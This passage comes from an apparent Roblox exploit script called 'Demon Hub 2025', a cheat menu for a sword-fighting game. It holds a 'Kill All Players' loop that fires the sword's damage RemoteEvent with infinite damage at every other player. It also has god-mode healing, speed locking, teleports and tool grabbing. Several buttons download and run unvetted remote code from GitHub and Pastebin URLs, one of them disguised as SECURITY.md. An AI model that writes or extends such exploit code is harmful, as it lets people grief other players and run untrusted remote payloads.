                local root = Utils.GetRootPart()
                if not root then return end
                
                for _, obj in pairs(workspace:GetDescendants()) do
                    if obj:IsA("Tool") and obj.Name:lower():find("sword") then
                        local handle = obj:FindFirstChild("Handle")
                        if handle and handle:FindFirstChildOfClass("TouchTransmitter") then
                            Utils.SafeExecute(function()
                                firetouchinterest(root, handle, 0)
                                firetouchinterest(root, handle, 1)
                            end)
                        end
                    end
                end
            end)
        end
    end)

    -- 13.2 Enhanced Drop Tools
    Tabs.Toggles:Toggle("Auto Drop Tools", false, function(state)
        States.AutoDropTools = state
        
        if state then
            local char = Utils.GetCharacter()
            local humanoid = Utils.GetHumanoid()
            if not char or not humanoid then return end
            
            -- Unequip all tools first
            humanoid:UnequipTools()
            task.wait(0.1)

            -- Process tools from both containers
            for _, container in ipairs({LocalPlayer.Backpack, char}) do
                for _, tool in ipairs(container:GetChildren()) do
                    if Utils.ValidateTool(tool) then
                        Utils.SafeExecute(function()
                            tool.CanBeDropped = true
                            
                            -- Equip and drop
                            if tool.Parent ~= char then
                                tool.Parent = char
                                task.wait(0.1)
                            end
                            
                            humanoid:EquipTool(tool)
                            task.wait(0.1)
                            humanoid:DropTool()
                            task.wait(0.1)
                        end)
                    end
                end
            end
            
            Utils.Notify("Tools", "All tools dropped", 2)
        end
    end)

    -- 13.3 Kill All Players
    Tabs.Toggles:Toggle("Kill All Players", false, function(state)
        States.KillAll = state

        if state then
            task.spawn(function()
                while States.KillAll do
                    local myRoot = Utils.GetRootPart()
                    local myHumanoid = Utils.GetHumanoid()
                    local char = Utils.GetCharacter()
                    
                    if myRoot and myHumanoid and char then
                        local sword = char:FindFirstChild("sword") or LocalPlayer.Backpack:FindFirstChild("sword")
                        
                        if Utils.ValidateTool(sword) then
                            -- Equip sword if not already equipped
                            if sword.Parent ~= char then
                                myHumanoid:EquipTool(sword)
                                task.wait(0.1)
                            end

                            local dmgPart = sword.Handle:FindFirstChild("dmg")
                            local remote = dmgPart and dmgPart:FindFirstChild("RemoteEvent")

                            if remote then
                                for _, player in ipairs(Services.Players:GetPlayers()) do
                                    if player ~= LocalPlayer and player.Character then
                                        local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
                                        local targetHum = player.Character:FindFirstChildOfClass("Humanoid")
                                        
                                        if targetRoot and targetHum and targetHum.Health > 0 then
                                            local distance = (myRoot.Position - targetRoot.Position).Magnitude
                                            if distance < 1000 then
                                                Utils.SafeExecute(function()
                                                    remote:FireServer(targetHum, math.huge)
                                                end)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                    task.wait(0.1) -- Prevent server overload
                end
            end)
        end
    end)

    -- 13.4 Anti-Death Toggle
    Tabs.Toggles:Toggle("Anti-Death Protection", false, function(state)
        Utils.DisconnectConnection("AntiDeath")
        
        if state then
            Connections.AntiDeath = Services.RunService.Heartbeat:Connect(function()
                local hum = Utils.GetHumanoid()
                if hum and hum.Health <= 0 then
                    hum.Health = hum.MaxHealth
                end
            end)
        end
    end)

    -- 13.5 Auto Respawn
    Tabs.Toggles:Toggle("Auto Respawn", false, function(state)
        if state then
            local connection
            connection = LocalPlayer.CharacterAdded:Connect(function()
                if not States.AutoRespawn then
                    connection:Disconnect()
                    return
                end
                
                task.wait(1)
                initializeCharacter()
                Utils.Notify("Auto Respawn", "Character reinitialized", 2)
            end)
            
            States.AutoRespawn = true
        else
            States.AutoRespawn = false
        end
    end)
end

-- ════════════════ [14] CLEANUP AND ERROR HANDLING ════════════════
-- Cleanup function for when script ends
local function cleanup()
    for name, connection in pairs(Connections) do
        if connection and connection.Disconnect then
            connection:Disconnect()
        end
    end
    
    if States.ToolConnection then
        States.ToolConnection:Disconnect()
    end
    
    Utils.Notify("Demon Hub", "Script cleanup completed", 2)
end

-- Handle script shutdown
game:BindToClose(cleanup)

-- Handle character death/respawn
LocalPlayer.CharacterRemoving:Connect(function()
    -- Store states that should persist through respawn
    local persistentStates = {
        PermaGod = States.PermaGod,
        AutoRespawn = States.AutoRespawn
    }
    
    -- Clean up character-specific connections
    for name, connection in pairs(Connections) do
        if name ~= "GrabTools" and connection and connection.Disconnect then
            connection:Disconnect()
            Connections[name] = nil
        end
    end
    
    -- Restore persistent states after respawn
    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(1)
        initializeCharacter()
        
        for stateName, stateValue in pairs(persistentStates) do
            States[stateName] = stateValue
        end
    end)
end)

-- ════════════════ [15] FINAL NOTIFICATIONS ════════════════
Utils.Notify("Demon Hub 2025", "All systems loaded successfully!", 3)
Utils.Notify("Controls", "Kill Aura: E key | Sword Spin: X to stop", 5)

-- Performance monitoring (optional)
task.spawn(function()
    while true do
        task.wait(30) -- Check every 30 seconds
        local memoryUsage = gcinfo()
        if memoryUsage > 50000 then -- 50MB threshold
            collectgarbage("collect")
            Utils.Notify("Performance", "Memory cleaned: " .. math.floor(memoryUsage/1000) .. "MB", 2)
        end
    end
end)

-- 13.4 Loop Walk Speed
Tabs.Toggles:Toggle("Lock Walk Speed (100)", false, function(state)
    States.WalkSpeedLoop = state
    
    if state then
        task.spawn(function()
            while States.WalkSpeedLoop do
                local hum = Utils.GetHumanoid()
                if hum then
                    hum.WalkSpeed = 100
                end
                task.wait()
            end
        end)
    end
end)

-- 14. ═══════════════ UI MODIFICATIONS ═══════════════
-- 14.1 Enhanced Effects GUI Destroyer
Tabs.UI:Button("Remove All Pass GUIs", function()
    local function destroyEffectsUI()
        -- Remove from all GUIs
        for _, gui in ipairs({Services.StarterGui, LocalPlayer:WaitForChild("PlayerGui")}) do
            local passes = gui:FindFirstChild("passes")
            if passes then
                for _, child in ipairs(passes:GetChildren()) do
                    if child:IsA("Frame") or child:IsA("TextButton") then
                        child:Destroy()
                    end
                end
            end
        end
    end
    
    -- Initial removal
    destroyEffectsUI()
    
    -- Auto-remove on respawn
    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(1)
        destroyEffectsUI()
    end)
    
    Utils.Notify("UI", "Effects GUI removed permanently", 3)
end)

-- 15. ═══════════════ TELEPORTATION SYSTEM ═══════════════
local TeleportLocations = {
    -- Main Areas
    {name = "Arena", cframe = CFrame.new(-18.393, 26.978, 9.003, 0.999929, 0, 0.011914, 0, 1, 0, -0.011914, 0, 0.999929)},
    {name = "Tree", cframe = CFrame.new(-143.156, 82.464, -246.582, 0.985673, 0, -0.168666, 0, 1, 0, 0.168666, 0, 0.985673)},
    {name = "Wall", cframe = CFrame.new(-251.617, 92.690, -335.043, -0.794003, 0, -0.607913, 0, 1, 0, 0.607913, 0, -0.794003)},
    {name = "Gray Wall", cframe = CFrame.new(-266.613, 119.881, -347.056, -0.698223, 0, -0.715880, 0, 1, 0, 0.715880, 0, -0.698223)},
    {name = "Secret Area", cframe = CFrame.new(-197.105, 22.953, -377.287) * CFrame.Angles(math.rad(0.044), math.rad(23.156), math.rad(0.08))},
    {name = "Outside", cframe = CFrame.new(-295.778, 25.596, -355.215, -0.409, 0, -0.913, 0, 1, 0, 0.913, 0, -0.409)},
    {name = "Gate Exterior", cframe = CFrame.new(-420.443, 25.596, -9.648, -0.0046, 0, -0.999989, 0, 1, 0, 0.999989, 0, -0.0046)},
    {name = "Rock Interior 1", cframe = CFrame.new(-341.302, 25.596, 47.305, 0.342859, 0, 0.939387, 0, 1, 0, -0.939387, 0, 0.342859)},
    {name = "Pillar Top", cframe = CFrame.new(-88.647, 70.197, 92.618, 0.952380, 0, -0.304915, 0, 1, 0, 0.304915, 0, 0.952380)},
    {name = "Rock Interior 2", cframe = CFrame.new(283.553, 25.596, 184.675, -0.423626, 0, 0.905837, 0, 1, 0, -0.905837, 0, -0.423626)},
    {name = "Rock Interior 3", cframe = CFrame.new(43.311, 25.500, -168.158, 0.168662, 0, -0.985674, 0, 1, 0, 0.985674, 0, 0.168662)},
    {name = "Main Gate", cframe = CFrame.new(5.181, 25.500, 419.471, 0.985070, 0, 0.172157, 0, 1, 0, -0.172157, 0, 0.985070)},
    {name = "Pillar Base", cframe = CFrame.new(88.735, 70.100, -84.323, -0.347119, 0, 0.937821, 0, 1, 0, -0.937821, 0, -0.347119)},
    {name = "Underground", cframe = CFrame.new(45.779, 21.812, -185.381, -0.863430, -0.497, -0.087601, 0, 0.173651, -0.984807, 0.504468, -0.850312, -0.149936)}
}

-- Create teleport buttons
for _, location in ipairs(TeleportLocations) do
    Tabs.Teleports:Button(location.name, function()
        local root = Character:FindFirstChild("HumanoidRootPart")
        if root then
            root.CFrame = location.cframe
            Utils.Notify("Teleport", "Teleported to " .. location.name, 2)
        end
    end)
end

-- Quick teleport keybinds
Tabs.Teleports:Button("Set Teleport Keybinds", function()
    Utils.Notify("Teleport", "Press 1-5 for quick teleports", 3)
    
    Services.UserInputService.InputBegan:Connect(function(input, processed)
        if processed then return end
        
        local keyMap = {
            [Enum.KeyCode.One] = 1,
            [Enum.KeyCode.Two] = 2,
            [Enum.KeyCode.Three] = 3,
            [Enum.KeyCode.Four] = 4,
            [Enum.KeyCode.Five] = 5
        }
        
        local index = keyMap[input.KeyCode]
        if index and TeleportLocations[index] then
            local root = Character:FindFirstChild("HumanoidRootPart")
            if root then
                root.CFrame = TeleportLocations[index].cframe
                Utils.Notify("Quick TP", "Teleported to " .. TeleportLocations[index].name, 1)
            end
        end
    end)
end)

-- 16. ═══════════════ POWER SYSTEM ═══════════════
local powerScripts = {
    {name = "1K Power (3s intervals)", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/1K"},
    {name = "2K Power (6s intervals)", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/2K"},
    {name = "5K Power (10s intervals)", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/5K"},
    {name = "10K Power (20s intervals)", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/10K"}
}

for _, script in ipairs(powerScripts) do
    Tabs.Power:Button(script.name, function()
        Utils.LoadScript(script.url)
    end)
end

-- Power Viewer
Tabs.Power:Button("Power Stats Viewer", function()
    Utils.LoadScript("https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/SECURITY.md")
end)

-- 17. ═══════════════ WORLD TELEPORTS ═══════════════
local worldScripts = {
    {name = "Coffee Shop", url = "https://pastebin.com/raw/Pvj5Ckc2"},
    {name = "Clockwork Arena", url = "https://pastebin.com/raw/NNp1NJKT"},
    {name = "Shipment", url = "https://pastebin.com/raw/J3Jk3NaC"},
    {name = "Purple Battlefields", url = "https://pastebin.com/raw/kdg5tmdg"},
    {name = "Lock Shift", url = "https://raw.githubusercontent.com/MiniNoobie/ShiftLockx/main/Shiftlock-MiniNoobie"}
}

for _, world in ipairs(worldScripts) do
    Tabs.Worlds:Button(world.name, function()
        Utils.LoadScript(world.url)
    end)
end

-- 18. ═══════════════ ENHANCED MUSIC PLAYER ═══════════════
local MusicPlayer = {
    CurrentSong = nil,
    Volume = 1,
    Songs = {
        -- Original songs
        {name = "🎵 Save Me", id = "128972545110914"},
        {name = "🎵 Rootkit", id = "5410081542"},
        {name = "🎵 Say So - Doja Cat", id = "1840036018"},
        {name = "🎵 The Future", id = "1837358800"},
        {name = "🎵 Feel Your Heart", id = "5410082171"},
        {name = "🎵 Forward", id = "5410081471"},
        {name = "🎵 No Sleep", id = "7029011778"},
        {name = "🎵 Pixel Terror", id = "5410080475"},
        {name = "🎵 Labyrinth", id = "7023690024"},
        {name = "🎵 All I Want", id = "7023680426"},
        {name = "🎵 Sacrified", id = "125847822956321"},
        {name = "🎵 Colors", id = "5410086062"},
        {name = "🎵 You Used To", id = "7023720291"},
        {name = "🎵 Rock Star", id = "108319978126931"},
        {name = "🎵 Coral Sea", id = "1839253629"},
        {name = "🎵 King", id = "1840030788"},
        {name = "🎵 Chasing Clouds", id = "5410082097"},
        {name = "🎵 Pendulum", id = "1843384804"},
        {name = "🎵 She Make Me", id = "1841807265"},
        {name = "🎵 I'm So Alone", id = "6774872457"},
        {name = "🎵 Hate Me", id = "6873260626"},
        {name = "🎵 Safe & Sound", id = "7024233823"},
        {name = "🎵 Dreamers", id = "7029083554"},
        {name = "🎵 Internet Boy", id = "5410084870"},
        {name = "🎵 Let's Play", id = "5410085763"},
        {name = "🎵 Night", id = "1836879421"},
        {name = "🎵 Pull Over", id = "1839983980"},
        {name = "🎵 WRLD - Hang Up", id = "5410084188"},
        {name = "🎵 Deja Vu", id = "6781116057"},
        {name = "🎵 Give The World", id = "1836778353"},
        {name = "🎵 Top Of The World", id = "1836847994"},
        {name = "🎵 Siren", id = "1840056866"},
        {name = "🎵 Overtime", id = "1842019862"},
        {name = "🎵 Hours", id = "7028932563"},
        {name = "🎵 Weekend Vibes", id = "1837083064"},
        {name = "🎵 Glacier", id = "7023760529"},
        {name = "🎵 Only You", id = "7024028859"},
        {name = "🎵 Hyper", id = "7023887630"},
        {name = "🎵 Play Cool", id = "7029017448"},
        {name = "🎵 What It's Like", id = "7028997537"},
        {name = "🎵 New World", id = "5410082346"},
        {name = "🎵 TOMB", id = "6782202354"},
        {name = "🎵 You Take Me", id = "7029070008"},
        {name = "🎵 Thinking About You", id = "7023445033"},
    }
}

-- Music Controls
Tabs.Music:Button("🛑 Stop All Music", function()
    -- Stop and destroy current song if managed by MusicPlayer
    if MusicPlayer.CurrentSong then
        MusicPlayer.CurrentSong:Stop()
        MusicPlayer.CurrentSong:Destroy()
        MusicPlayer.CurrentSong = nil
    end

    -- Define all locations to search for sounds
    local soundContainers = {
        Services.SoundService,
        workspace,
        Services.Lighting,
        Services.ReplicatedStorage,
        Services.Players,
        Services.StarterGui,
        Services.StarterPack
    }

    -- Recursively find and destroy all Sound instances
    for _, container in pairs(soundContainers) do
        for _, descendant in pairs(container:GetDescendants()) do
            if descendant:IsA("Sound") then
                descendant:Stop()
                descendant:Destroy()
            end
        end
    end

    Utils.Notify("Music", "All music and sounds were stopped.", 2)
end)

-- Volume Control
Tabs.Music:Slider("Volume", 0, 100, 50, function(value)
    MusicPlayer.Volume = value / 100
    if MusicPlayer.CurrentSong then
        MusicPlayer.CurrentSong.Volume = MusicPlayer.Volume
    end
end)

-- Create song buttons
for _, song in ipairs(MusicPlayer.Songs) do
    Tabs.Music:Button(song.name, function()
        -- Stop current song
        if MusicPlayer.CurrentSong then
            MusicPlayer.CurrentSong:Stop()
            MusicPlayer.CurrentSong:Destroy()
        end
        
        -- Play new song
        MusicPlayer.CurrentSong = Instance.new("Sound")
        MusicPlayer.CurrentSong.SoundId = "rbxassetid://" .. song.id
        MusicPlayer.CurrentSong.Volume = MusicPlayer.Volume
        MusicPlayer.CurrentSong.Looped = true
        MusicPlayer.CurrentSong.Parent = Services.SoundService
        MusicPlayer.CurrentSong:Play()
        
        Utils.Notify("Music", "Now playing: " .. song.name, 3)
    end)
end

-- 19. ═══════════════ SETTINGS & CLEANUP ═══════════════
-- 19.1 Auto-reconnect on disconnect
Tabs.Settings:Toggle("Auto Reconnect", false, function(state)
    if state then
        LocalPlayer.OnTeleport:Connect(function(teleportState)
            if teleportState == Enum.TeleportState.Failed then
                Utils.Notify("Reconnect", "Teleport failed, attempting reconnect...", 5)
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
            end
        end)
    end
end)

local Lighting = game:GetService("Lighting")
local Settings = Tabs.Settings
local disabledInstances = {}
local originalLighting = nil

Settings:Toggle("Performance Mode", false, function(state)
    if state then
        -- Save original lighting settings if not saved yet
        if not originalLighting then
            originalLighting = {
                Ambient = Lighting.Ambient,
                Brightness = Lighting.Brightness,
                OutdoorAmbient = Lighting.OutdoorAmbient,
                FogEnd = Lighting.FogEnd,
                ClockTime = Lighting.ClockTime,
                Sky = Lighting:FindFirstChildOfClass("Sky") and Lighting:FindFirstChildOfClass("Sky"):Clone() or nil
            }
        end

        -- Apply night mode lighting
        Lighting.Ambient = Color3.fromRGB(10, 10, 10)          -- Dark ambient
        Lighting.Brightness = 1                                -- Keep brightness moderate
        Lighting.OutdoorAmbient = Color3.fromRGB(15, 15, 20)  -- Slight blue tint
        Lighting.FogEnd = 150                                  -- Fog to limit view distance
        Lighting.ClockTime = 0                                 -- Midnight (night)

        -- Replace sky with a dark night sky if available
        local existingSky = Lighting:FindFirstChildOfClass("Sky")
        if existingSky then existingSky:Destroy() end
        if originalLighting.Sky then
            local nightSky = originalLighting.Sky:Clone()
            -- You can customize nightSky properties here if needed
            nightSky.Parent = Lighting
        end

        -- Lower rendering quality for performance
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01

        -- Disable performance-heavy instances
        for _, desc in pairs(workspace:GetDescendants()) do
            if desc:IsA("ParticleEmitter") or desc:IsA("Trail") or desc:IsA("Beam") 
                or desc:IsA("Decal") or desc:IsA("Texture") 
                or desc:IsA("SpotLight") or desc:IsA("SurfaceLight") or desc:IsA("PointLight") then

                if desc:IsA("Decal") or desc:IsA("Texture") then
                    desc.Transparency = 1
                else
                    desc.Enabled = false
                end
                table.insert(disabledInstances, desc)
            end
        end

        Utils.Notify("Performance", "Performance mode and night mode enabled", 3)
    else
        -- Revert lighting settings if saved
        if originalLighting then
            for prop, value in pairs(originalLighting) do
                if prop ~= "Sky" then
                    Lighting[prop] = value
                end
            end

            -- Remove current sky and restore original sky if any
            local currentSky = Lighting:FindFirstChildOfClass("Sky")
            if currentSky then currentSky:Destroy() end
            if originalLighting.Sky then
                originalLighting.Sky.Parent = Lighting
            end
            originalLighting = nil
        end

        -- Re-enable disabled instances
        for _, inst in pairs(disabledInstances) do
            if inst and inst.Parent then
                if inst:IsA("Decal") or inst:IsA("Texture") then
                    inst.Transparency = 0
                else
                    inst.Enabled = true
                end
            end
        end
        disabledInstances = {}

        -- Restore rendering quality
        settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic

        Utils.Notify("Performance", "Performance mode disabled", 3)
    end
end)

-- 19.3 Discord Webhook Integration
Tabs.Settings:Button("Join Discord", function()
    local discordInvite = "https://discord.com/invite/J7AYrApFAH"
    
    -- Try to copy to clipboard with error handling
    local success, error = pcall(function()
        setclipboard(discordInvite)
    end)
    
    if success then
        Utils.Notify("Discord", "Discord invite copied to clipboard!", 3)
    else
        Utils.Notify("Discord", "Failed to copy invite. Please visit: " .. discordInvite, 5)
        warn("Clipboard error: " .. tostring(error))
    end
end)

-- 19.4 Enhanced Save/Load Settings System
local SettingsManager = {}

-- Configuration
local CONFIG_VERSION = "2.0"
local AUTO_SAVE_INTERVAL = 300 -- 5 minutes
local MAX_BACKUPS = 5

-- File paths
local function getConfigPath()
    return "ScriptSettings_" .. game.PlaceId .. ".json"
end

local function getBackupPath(index)
    return "ScriptSettings_" .. game.PlaceId .. "_backup" .. index .. ".json"
end

-- Default configuration
local function createDefaultConfig()
    return {
        WalkSpeed = 16,
        JumpPower = 50,
        States = {},
        Volume = 0.5,
        LastSaved = os.time(),
        Version = CONFIG_VERSION,
        AutoSave = true,
        BackupCount = 0,
        GameVersion = game.PlaceVersion or "Unknown"
    }
end

-- Enhanced save function with backup system
local function saveSettings(showNotification)
    local success, error = pcall(function()
        local config = {
            WalkSpeed = Movement and Movement.WalkSpeed or 16,
            JumpPower = Movement and Movement.JumpPower or 50,
            States = States or {},
            Volume = MusicPlayer and MusicPlayer.Volume or 0.5,
            LastSaved = os.time(),
            Version = CONFIG_VERSION,
            AutoSave = SettingsManager.AutoSave or true,
            BackupCount = (SettingsManager.BackupCount or 0) + 1,
            GameVersion = game.PlaceVersion or "Unknown"
        }
        
        -- Convert to JSON string
        local configString = HttpService:JSONEncode(config)
        
        if writefile then
            local configPath = getConfigPath()
            
            -- Create backup if file exists
            if isfile(configPath) then
                local backupIndex = (config.BackupCount % MAX_BACKUPS) + 1
                local backupPath = getBackupPath(backupIndex)
                
                -- Save current config as backup
                local currentConfig = readfile(configPath)
                writefile(backupPath, currentConfig)
            end
            
            -- Save new config
            writefile(configPath, configString)
            
            if showNotification then
                Utils.Notify("Settings", "Settings saved successfully (Backup #" .. config.BackupCount .. ")", 2)
            end
        else
            -- Fallback storage methods
            if syn and syn.write_file then
                syn.write_file(getConfigPath(), configString)
                if showNotification then
                    Utils.Notify("Settings", "Settings saved (Synapse)", 2)
                end
            elseif setclipboard then
                setclipboard(configString)
                if showNotification then
                    Utils.Notify("Settings", "Settings saved to clipboard (no file system)", 2)
                end
            else
                if showNotification then
                    Utils.Notify("Settings", "No save method available", 3)
                end
            end
        end
        
        SettingsManager.BackupCount = config.BackupCount
    end)
    
    if not success then
        if showNotification then
            Utils.Notify("Settings", "Failed to save: " .. tostring(error), 3)
        end
        warn("Save error: " .. tostring(error))
    end
    
    return success
end

-- Enhanced load function with backup recovery
local function loadSettings(showNotification)
    local success, error = pcall(function()
        local configPath = getConfigPath()
        local config = nil
        
        -- Try to load main config
        if readfile and isfile(configPath) then
            local configString = readfile(configPath)
            config = HttpService:JSONDecode(configString)
        elseif syn and syn.read_file then
            config = HttpService:JSONDecode(syn.read_file(configPath))
        end
        
        -- If main config failed, try backups
        if not config then
            for i = 1, MAX_BACKUPS do
                local backupPath = getBackupPath(i)
                if isfile(backupPath) then
                    local backupString = readfile(backupPath)
                    local backupConfig = HttpService:JSONDecode(backupString)
                    if backupConfig and backupConfig.Version then
                        config = backupConfig
                        if showNotification then
                            Utils.Notify("Settings", "Loaded from backup #" .. i, 2)
                        end
                        break
                    end
                end
            end
        end
        
        if not config then
            config = createDefaultConfig()
            if showNotification then
                Utils.Notify("Settings", "Using default settings", 2)
            end
        end
        
        -- Version migration
        if config.Version ~= CONFIG_VERSION then
            config = migrateConfig(config)
        end
        
        -- Apply settings with validation
        if config.WalkSpeed and Movement then
            Movement.WalkSpeed = math.clamp(tonumber(config.WalkSpeed) or 16, 1, 500)
        end
        
        if config.JumpPower and Movement then
            Movement.JumpPower = math.clamp(tonumber(config.JumpPower) or 50, 1, 1000)
        end
        
        if config.States and type(config.States) == "table" then
            for key, value in pairs(config.States) do
                if type(value) == "boolean" then
                    States[key] = value
                end
            end
        end
        
        if config.Volume and MusicPlayer then
            MusicPlayer.Volume = math.clamp(tonumber(config.Volume) or 0.5, 0, 1)
        end
        
        -- Store manager settings
        SettingsManager.AutoSave = config.AutoSave
        SettingsManager.BackupCount = config.BackupCount or 0
        
        if showNotification then
            Utils.Notify("Settings", "Settings loaded successfully", 2)
        end
    end)
    
    if not success then
        if showNotification then
            Utils.Notify("Settings", "Failed to load: " .. tostring(error), 3)
        end
        warn("Load error: " .. tostring(error))
    end
    
    return success
end

-- Config migration function
local function migrateConfig(oldConfig)
    local newConfig = createDefaultConfig()
    
    -- Migrate old values to new structure
    if oldConfig.WalkSpeed then newConfig.WalkSpeed = oldConfig.WalkSpeed end
    if oldConfig.JumpPower then newConfig.JumpPower = oldConfig.JumpPower end
    if oldConfig.States then newConfig.States = oldConfig.States end
    if oldConfig.Volume then newConfig.Volume = oldConfig.Volume end
    if oldConfig.AutoSave then newConfig.AutoSave = oldConfig.AutoSave end
    if oldConfig.BackupCount then newConfig.BackupCount = oldConfig.BackupCount end
    
    return newConfig
end

-- Auto-save system
local autoSaveConnection = nil
local function startAutoSave()
    if autoSaveConnection then
        autoSaveConnection:Disconnect()
    end
    
    autoSaveConnection = task.spawn(function()
        while SettingsManager.AutoSave do
            task.wait(AUTO_SAVE_INTERVAL)
            if SettingsManager.AutoSave then
                saveSettings(false) -- Don't show notification for auto-save
            end
        end
    end)
end

-- Initialize auto-save
SettingsManager.AutoSave = true
startAutoSave()

-- UI Buttons
Tabs.Settings:Button("Save Settings", function()
    saveSettings(true)
end)

Tabs.Settings:Button("Load Settings", function()
    loadSettings(true)
end)

-- Auto-save toggle
Tabs.Settings:Toggle("Auto Save", SettingsManager.AutoSave, function(state)
    SettingsManager.AutoSave = state
    if state then
        startAutoSave()
        Utils.Notify("Auto Save", "Auto save enabled (every 5 minutes)", 2)
    else
        if autoSaveConnection then
            autoSaveConnection:Disconnect()
        end
        Utils.Notify("Auto Save", "Auto save disabled", 2)
    end
end)

-- Backup management
Tabs.Settings:Button("Restore from Backup", function()
    local success, error = pcall(function()
        local backupFound = false
        local backupList = {}
        
        -- Find all available backups
        for i = 1, MAX_BACKUPS do
            local backupPath = getBackupPath(i)
            if isfile(backupPath) then
                local backupString = readfile(backupPath)
                local backupConfig = HttpService:JSONDecode(backupString)
                if backupConfig and backupConfig.LastSaved then
                    table.insert(backupList, {
                        index = i,
                        date = os.date("%Y-%m-%d %H:%M:%S", backupConfig.LastSaved),
                        config = backupConfig
                    })
                    backupFound = true
                end
            end
        end
        
        if not backupFound then
            Utils.Notify("Backup", "No backups found", 2)
            return
        end
        
        -- Sort by date (newest first)
        table.sort(backupList, function(a, b)
            return a.config.LastSaved > b.config.LastSaved
        end)
        
        -- Use the newest backup
        local newestBackup = backupList[1]
        
        -- Apply the backup
        local config = newestBackup.config
        if config.WalkSpeed and Movement then
            Movement.WalkSpeed = math.clamp(config.WalkSpeed, 1, 500)
        end
        if config.JumpPower and Movement then
            Movement.JumpPower = math.clamp(config.JumpPower, 1, 1000)
        end
        if config.States then
            for key, value in pairs(config.States) do
                States[key] = value
            end
        end
        if config.Volume and MusicPlayer then
            MusicPlayer.Volume = math.clamp(config.Volume, 0, 1)
        end
        
        Utils.Notify("Backup", "Restored from backup: " .. newestBackup.date, 3)
    end)
    
    if not success then
        Utils.Notify("Backup", "Failed to restore: " .. tostring(error), 3)
    end
end)

-- Enhanced reset with better confirmation
local resetConfirmation = false
local resetTimer = nil

Tabs.Settings:Button("Reset Everything", function()
    if not resetConfirmation then
        resetConfirmation = true
        Utils.Notify("Reset", "Click again within 5 seconds to confirm COMPLETE RESET", 3)
        
        -- Auto-cancel confirmation after 5 seconds
        resetTimer = task.spawn(function()
            task.wait(5)
            resetConfirmation = false
            Utils.Notify("Reset", "Reset cancelled", 1)
        end)
        return
    end
    
    -- Cancel the timer
    if resetTimer then
        task.cancel(resetTimer)
    end
    
    local success, error = pcall(function()
        -- Create backup before reset
        saveSettings(false)
        
        -- Safely disconnect all connections
        if Connections then
            for name, connection in pairs(Connections) do
                if connection and typeof(connection) == "RBXScriptConnection" then
                    connection:Disconnect()
                end
            end
            Connections = {}
        end
        
        -- Reset states safely
        if States then
            for key in pairs(States) do
                States[key] = false
            end
        end
        
        -- Stop music safely
        if MusicPlayer and MusicPlayer.CurrentSong then
            if MusicPlayer.CurrentSong.IsPlaying then
                MusicPlayer.CurrentSong:Stop()
            end
            MusicPlayer.CurrentSong:Destroy()
            MusicPlayer.CurrentSong = nil
        end
        
        -- Reset movement values
        if Movement then
            Movement.WalkSpeed = 16
            Movement.JumpPower = 50
        end
        
        -- Reset player to defaults
        local player = Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("Humanoid") then
            local humanoid = player.Character.Humanoid
            humanoid.WalkSpeed = 16
            humanoid.JumpPower = 50
        end
        
        -- Stop auto-save
        SettingsManager.AutoSave = false
        if autoSaveConnection then
            autoSaveConnection:Disconnect()
        end
        
        resetConfirmation = false
        Utils.Notify("Reset", "Everything reset successfully (backup created)", 3)
    end)
    
    if not success then
        Utils.Notify("Reset", "Reset failed: " .. tostring(error), 3)
        warn("Reset error: " .. tostring(error))
        resetConfirmation = false
    end
end)

-- Enhanced export with metadata
Tabs.Settings:Button("Export Settings", function()
    local success, error = pcall(function()
        local config = {
            WalkSpeed = Movement and Movement.WalkSpeed or 16,
            JumpPower = Movement and Movement.JumpPower or 50,
            States = States or {},
            Volume = MusicPlayer and MusicPlayer.Volume or 0.5,
            GameId = game.PlaceId,
            GameName = game.Name,
            ExportDate = os.date("%Y-%m-%d %H:%M:%S"),
            ExportTime = os.time(),
            Version = CONFIG_VERSION,
            PlayerName = Players.LocalPlayer.Name,
            AutoSave = SettingsManager.AutoSave
        }
        
        local configString = HttpService:JSONEncode(config)
        
        if setclipboard then
            setclipboard(configString)
            Utils.Notify("Export", "Settings exported to clipboard", 2)
        else
            -- Fallback: try to save to file with export name
            if writefile then
                local exportPath = "Export_" .. os.date("%Y%m%d_%H%M%S") .. ".json"
                writefile(exportPath, configString)
                Utils.Notify("Export", "Settings exported to: " .. exportPath, 3)
            else
                Utils.Notify("Export", "No export method available", 3)
            end
        end
    end)
    
    if not success then
        Utils.Notify("Export", "Export failed: " .. tostring(error), 3)
        warn("Export error: " .. tostring(error))
    end
end)

-- Enhanced import with validation
Tabs.Settings:Button("Import Settings", function()
    local success, error = pcall(function()
        local clipboardContent = ""
        
        if getclipboard then
            clipboardContent = getclipboard()
        else
            Utils.Notify("Import", "Clipboard access not available", 3)
            return
        end
        
        if not clipboardContent or clipboardContent == "" then
            Utils.Notify("Import", "Clipboard is empty", 2)
            return
        end
        
        local config = HttpService:JSONDecode(clipboardContent)
        
        -- Validate imported data
        if not config or type(config) ~= "table" then
            Utils.Notify("Import", "Invalid settings format", 3)
            return
        end
        
        -- Check version compatibility
        if config.Version and config.Version ~= CONFIG_VERSION then
            Utils.Notify("Import", "Version mismatch - attempting migration", 2)
            config = migrateConfig(config)
        end
        
        -- Show import info
        if config.ExportDate then
            Utils.Notify("Import", "Importing settings from: " .. config.ExportDate, 2)
        end
        
        -- Apply imported settings with validation
        if config.WalkSpeed and Movement then
            Movement.WalkSpeed = math.clamp(tonumber(config.WalkSpeed) or 16, 1, 500)
        end
        
        if config.JumpPower and Movement then
            Movement.JumpPower = math.clamp(tonumber(config.JumpPower) or 50, 1, 1000)
        end
        
        if config.States and type(config.States) == "table" then
            for key, value in pairs(config.States) do
                if type(value) == "boolean" then
                    States[key] = value
                end
            end
        end
        
        if config.Volume and MusicPlayer then
            MusicPlayer.Volume = math.clamp(tonumber(config.Volume) or 0.5, 0, 1)
        end
        
        if config.AutoSave ~= nil then
            SettingsManager.AutoSave = config.AutoSave
        end
        
